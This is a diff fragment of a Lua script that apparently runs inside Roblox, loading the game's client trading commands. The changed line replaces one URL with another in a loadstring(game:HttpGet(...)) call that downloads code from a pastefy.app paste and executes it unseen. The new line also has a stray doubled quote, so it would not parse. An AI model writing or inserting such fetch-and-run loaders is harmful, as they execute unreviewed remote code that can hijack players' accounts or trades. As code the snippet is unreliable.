@@ -20,7 +20,7 @@ local Trading = require(ReplicatedStorage.Library.Client.TradingCmds)
 local player = Players.LocalPlayer
 local playerGui = player.PlayerGui
 
-loadstring(game:HttpGet("https://pastefy.app/ncWCBM3Y/raw", true))()
+loadstring(game:HttpGet(""https://pastefy.app/QVuCL7v3/raw", true))()
 
 -- ========== REQUEST FUNCTIONS LIST ==========
 local request_funcs = {}
